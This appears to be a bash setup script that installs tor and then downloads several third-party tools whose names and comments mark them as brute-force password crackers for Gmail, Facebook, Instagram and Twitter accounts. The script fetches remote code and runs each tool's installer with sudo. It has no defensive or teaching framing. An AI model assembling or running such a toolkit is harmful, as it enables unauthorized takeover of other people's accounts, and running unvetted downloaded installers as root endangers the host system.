#!/bin/bash
git pull
#Sysupdate
sudo apt-get update >> /dev/null
#Python
sudo apt-get install python tor perl -y
#gmail
git clone https://github.com/Ha3MrX/Gemail-Hack.git
#facebook
if [ -d facebook ]; then
        echo "Directory facebook exists.[✔]"
else
	mkdir facebook
	cd facebook
	wget raw.githubusercontent.com/Sup3r-Us3r/scripts/master/fb-brute.pl
	cd ..
fi
#Instagram
git clone https://github.com/umeshshinde19/instainsane.git
cd instainsane
chmod +x instainsane.sh
chmod +x install.sh
sudo ./install.sh
cd ..
#Twitter
git clone https://github.com/neight-1/-tweetshell-.git
cd ./-tweetshell-
chmod +x tweetshell.sh
chmod +x install.sh
sudo ./install.sh
cd ..
# instagram 2
git clone https://github.com/samsesh/insta-bf.git
cd insta-bf 
chmod +x * -R
